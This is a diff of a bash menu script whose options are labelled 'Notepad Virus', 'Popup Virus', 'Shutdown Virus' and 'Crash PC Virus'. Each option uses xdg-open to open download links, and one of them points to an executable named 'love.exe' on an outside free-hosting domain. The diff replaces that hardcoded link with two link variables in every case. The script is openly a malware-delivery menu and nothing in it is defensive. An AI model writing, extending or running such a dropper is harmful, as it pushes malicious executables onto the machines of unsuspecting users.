@@ -40,26 +40,35 @@ link1="https://wdevmail.000webhostapp.com/Bach%20File/love.exe"
             # Add code to run the other bash script here
             xdg-open "$link0" &
             xdg-open "$link1" &
+  # Open link in default browser
             ;;
         2)
             echo "You selected: Notepad Virus"
             # Add code to run the other bash script here
-            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
+            xdg-open "$link0" &
+            xdg-open "$link1" &
+  # Open link in default browser
             ;;
         3)
             echo "You selected: Popup Virus"
             # Add code to run the other bash script here
-            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
+            xdg-open "$link0" &
+            xdg-open "$link1" &
+  # Open link in default browser
             ;;
 	    4)
             echo "You selected: Shutdown Virus"
             # Add code to run the other bash script here
-            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
+            xdg-open "$link0" &
+            xdg-open "$link1" &
+  # Open link in default browser
             ;;
 		5)
             echo "You selected: Crash PC Virus"
             # Add code to run the other bash script here
-            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
+            xdg-open "$link0" &
+            xdg-open "$link1" &
+  # Open link in default browser
             ;;
         6)
             echo "Exiting..."
